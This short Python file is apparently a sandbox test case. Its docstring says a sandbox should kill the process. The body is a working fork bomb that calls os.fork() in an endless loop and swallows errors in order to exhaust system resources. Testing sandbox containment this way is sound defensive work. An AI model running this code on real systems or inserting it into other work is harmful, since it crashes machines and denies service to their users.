"""
Description
    Fork bomb that recursively spawns processes to exhaust system resources

    The sandbox should kill the process before it destabilizes the system

"""

import os
while True:
    try:
        os.fork()
    except:
        pass